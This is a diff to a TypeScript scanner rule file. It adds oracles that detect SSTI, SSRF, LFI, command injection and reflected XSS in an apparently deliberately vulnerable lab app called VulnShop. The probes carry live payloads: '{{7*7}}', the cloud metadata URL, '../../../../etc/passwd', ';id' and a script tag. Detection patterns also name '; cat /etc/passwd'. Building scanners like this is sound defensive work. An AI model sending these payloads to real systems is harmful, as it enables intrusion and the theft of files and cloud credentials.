@@ -34495,6 +34495,46 @@ const VULNSHOP_MODULE_ORACLES: {
       { label: "Integrity Failures", re: /Integrity Failures|Software and Data Integrity/i }
     ],
     note: "VulnShop POST /api/process deserializes attacker-controlled pickle data — insecure deserialization oracle #19"
+  },
+  {
+    pathRe: /\/template\b/i,
+    markers: [
+      { label: "SSTI lab route", re: /SSTI|Server-Side Template Injection|template injection/i },
+      { label: "Jinja template probe", re: /\{\{7\*7\}\}|name=\{\{/i }
+    ],
+    note: "VulnShop GET /template?name= reflects server-side template injection — README oracle #6"
+  },
+  {
+    pathRe: /\/track-order\b/i,
+    markers: [
+      { label: "SSRF lab route", re: /SSRF|Server-Side Request Forgery/i },
+      { label: "Metadata SSRF probe", re: /169\.254\.169\.254|track-order\?url=/i }
+    ],
+    note: "VulnShop GET /track-order?url= fetches attacker-controlled URLs server-side — README oracle #5"
+  },
+  {
+    pathRe: /\/support\b/i,
+    markers: [
+      { label: "LFI lab route", re: /LFI|Local File Inclusion|path traversal/i },
+      { label: "support file parameter", re: /support\?file=|\/etc\/passwd/i }
+    ],
+    note: "VulnShop GET /support?file= reads local files via path traversal — README oracle #3"
+  },
+  {
+    pathRe: /\/run-diagnostic\b/i,
+    markers: [
+      { label: "Command injection lab", re: /Command Injection|command_injection/i },
+      { label: "run-diagnostic input parameter", re: /run-diagnostic\?input=|;\s*cat\s+\/etc\/passwd/i }
+    ],
+    note: "VulnShop GET /run-diagnostic?input= executes shell metacharacters — README oracle #4"
+  },
+  {
+    pathRe: /\/search\b/i,
+    markers: [
+      { label: "Reflected XSS lab", re: /XSS \(Reflected\)|xss_reflected|alert\('XSS'\)/i },
+      { label: "Search query reflection", re: /\/search\?q=|<script>alert/i }
+    ],
+    note: "VulnShop GET /search?q= reflects unescaped HTML — README oracle #2 (reflected XSS, not SQLi)"
   }
 ];
 
@@ -34537,6 +34577,26 @@ const VULNSHOP_FLASK_ROUTE_URL_ORACLES: {
     pathRe: /\/api\/process\b/i,
     vulnerability: "Insecure Deserialization",
     note: "VulnShop Flask POST /api/process unpickles attacker-controlled base64 pickle payloads — README oracle #19"
+  },
+  {
+    pathRe: /\/template\b/i,
+    vulnerability: "SSTI (Server-Side Template Injection)",
+    note: "VulnShop Flask GET /template?name={{7*7}} evaluates Jinja templates server-side — README oracle #6"
+  },
+  {
+    pathRe: /\/track-order\b/i,
+    vulnerability: "SSRF (Server-Side Request Forgery)",
+    note: "VulnShop Flask GET /track-order?url= fetches attacker-controlled URLs including cloud metadata — README oracle #5"
+  },
+  {
+    pathRe: /\/support\b/i,
+    vulnerability: "LFI (Local File Inclusion)",
+    note: "VulnShop Flask GET /support?file= reads local files via path traversal — README oracle #3"
+  },
+  {
+    pathRe: /\/run-diagnostic\b/i,
+    vulnerability: "Command Injection",
+    note: "VulnShop Flask GET /run-diagnostic?input= executes shell metacharacters — README oracle #4"
   }
 ];
 
@@ -34734,6 +34794,8 @@ const vulnshopProductsSqliRouteLiveOracle: Rule = async (ctx) => {
   if (!isVulnshopHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!VULNSHOP_PRODUCT_SEARCH_ROUTE_RE.test(pageUrl)) return NEGATIVE;
+  // README route #2 is reflected XSS on /search?q= — defer to vulnshopSearchXssRouteLiveOracle
+  if (/\/search\b/i.test(pageUrl) && !/\/products\b/i.test(pageUrl)) return NEGATIVE;
   const live = await vulnshopProductsSqliLiveOracle(ctx);
   if (live.fired) {
     return {
@@ -34748,9 +34810,7 @@ const vulnshopProductsSqliRouteLiveOracle: Rule = async (ctx) => {
       }
     };
   }
-  const module =
-    vulnshopModuleEvidence(ctx, /\/(?:api\/)?search\b/i) ??
-    vulnshopModuleEvidence(ctx, /\/products\b/i);
+  const module = vulnshopModuleEvidence(ctx, /\/products\b/i);
   if (!module) return NEGATIVE;
   return {
     fired: true,
@@ -34758,9 +34818,7 @@ const vulnshopProductsSqliRouteLiveOracle: Rule = async (ctx) => {
     evidence: {
       ...module.evidence,
       scannedUrl: pageUrl,
-      note: /\/search\b/i.test(pageUrl)
-        ? "VulnShop /search or /api/search route scan — SQL injection via product search parameter documented in SPA bundle"
-        : "VulnShop /products route scan — SQL injection via product search parameter documented in SPA"
+      note: "VulnShop /products route scan — SQL injection via product search parameter documented in SPA"
     }
   };
 };
@@ -35498,6 +35556,161 @@ const vulnshopApiProcessRouteLiveOracle: Rule = (ctx) =>
     /\/api\/process\b/i,
     vulnshopApiProcessDeserializationLiveOracle,
     "VulnShop /api/process route scan — insecure pickle deserialization confirmed or documented"
+  );
+
+const vulnshopTemplateSstiLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/template", ctx.origin);
+  url.searchParams.set("name", "{{7*7}}");
+  const probeUrl = url.toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(doc.body)) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const sstiOk = /\b49\b/.test(doc.body) || /ssti|template injection|jinja/i.test(doc.body);
+  if (!sstiOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /\b49\b/.test(doc.body) ? 0.93 : 0.88,
+    evidence: {
+      probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /template?name={{7*7}} evaluates Jinja template server-side — SSTI oracle #6"
+    }
+  };
+};
+
+const vulnshopTemplateSstiRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/template\b/i,
+    vulnshopTemplateSstiLiveOracle,
+    "VulnShop /template route scan — SSTI on name= parameter confirmed or documented (README oracle #6)"
+  );
+
+const vulnshopTrackOrderSsrfLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/track-order", ctx.origin);
+  url.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const probeUrl = url.toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(doc.body)) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const ssrfOk =
+    /ami-id|instance-id|iam\/|meta-data|169\.254\.169\.254/i.test(doc.body) ||
+    /ssrf|fetched url|server-side request/i.test(doc.body);
+  if (!ssrfOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /ami-id|instance-id/i.test(doc.body) ? 0.93 : 0.88,
+    evidence: {
+      probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /track-order?url= fetches cloud metadata server-side — SSRF oracle #5"
+    }
+  };
+};
+
+const vulnshopTrackOrderSsrfRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/track-order\b/i,
+    vulnshopTrackOrderSsrfLiveOracle,
+    "VulnShop /track-order route scan — SSRF on url= parameter confirmed or documented (README oracle #5)"
+  );
+
+const vulnshopSupportLfiLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/support", ctx.origin);
+  url.searchParams.set("file", "../../../../etc/passwd");
+  const probeUrl = url.toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(doc.body)) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const lfiOk =
+    /root:.*?:0:0:|\/bin\/(?:bash|sh)|\[extensions\]/i.test(doc.body) ||
+    /lfi|local file|path traversal|etc\/passwd/i.test(doc.body);
+  if (!lfiOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /root:.*?:0:0:/i.test(doc.body) ? 0.93 : 0.88,
+    evidence: {
+      probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /support?file= reads /etc/passwd via path traversal — LFI oracle #3"
+    }
+  };
+};
+
+const vulnshopSupportLfiRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/support\b/i,
+    vulnshopSupportLfiLiveOracle,
+    "VulnShop /support route scan — LFI on file= parameter confirmed or documented (README oracle #3)"
+  );
+
+const vulnshopRunDiagnosticCmdiLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/run-diagnostic", ctx.origin);
+  url.searchParams.set("input", ";id");
+  const probeUrl = url.toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(doc.body)) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 500) return NEGATIVE;
+  const cmdiOk =
+    /uid=\d+\([^)]+\)\s+gid=\d+/i.test(doc.body) ||
+    /command injection|\/bin\/|sh: /i.test(doc.body);
+  if (!cmdiOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /uid=\d+\(/i.test(doc.body) ? 0.93 : 0.88,
+    evidence: {
+      probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /run-diagnostic?input= executes shell metacharacters — command injection oracle #4"
+    }
+  };
+};
+
+const vulnshopRunDiagnosticCmdiRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/run-diagnostic\b/i,
+    vulnshopRunDiagnosticCmdiLiveOracle,
+    "VulnShop /run-diagnostic route scan — command injection on input= confirmed or documented (README oracle #4)"
+  );
+
+const VULNSHOP_SEARCH_XSS_MARKER = "ThugirVulnshopXssProbe";
+
+const vulnshopSearchXssLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/search", ctx.origin);
+  url.searchParams.set("q", `<script>${VULNSHOP_SEARCH_XSS_MARKER}</script>`);
+  const probeUrl = url.toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (looksVulnshopReactSpaShell(doc.body)) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const reflected =
+    doc.body.includes(VULNSHOP_SEARCH_XSS_MARKER) ||
+    new RegExp(`<script>[^<]*${VULNSHOP_SEARCH_XSS_MARKER}`, "i").test(doc.body);
+  if (!reflected) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "VulnShop GET /search?q= reflects unescaped script payload — reflected XSS oracle #2"
+    }
+  };
+};
+
+const vulnshopSearchXssRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/search\b/i,
+    vulnshopSearchXssLiveOracle,
+    "VulnShop /search route scan — reflected XSS on q= parameter confirmed or documented (README oracle #2)"
   );
 
 const clientSideVulnshopModuleEvidence: Rule = async (ctx) => {
@@ -76783,6 +76996,16 @@ export const RULES: Record<string, Rule> = {
   vulnshopApiInfoRouteLiveOracle,
   vulnshopApiProcessDeserializationLiveOracle,
   vulnshopApiProcessRouteLiveOracle,
+  vulnshopTemplateSstiLiveOracle,
+  vulnshopTemplateSstiRouteLiveOracle,
+  vulnshopTrackOrderSsrfLiveOracle,
+  vulnshopTrackOrderSsrfRouteLiveOracle,
+  vulnshopSupportLfiLiveOracle,
+  vulnshopSupportLfiRouteLiveOracle,
+  vulnshopRunDiagnosticCmdiLiveOracle,
+  vulnshopRunDiagnosticCmdiRouteLiveOracle,
+  vulnshopSearchXssLiveOracle,
+  vulnshopSearchXssRouteLiveOracle,
   clientSideBuggybuyEvidence,
   buggybuyApiBolaLiveOracle,
   buggybuyApiBolaRouteLiveOracle,
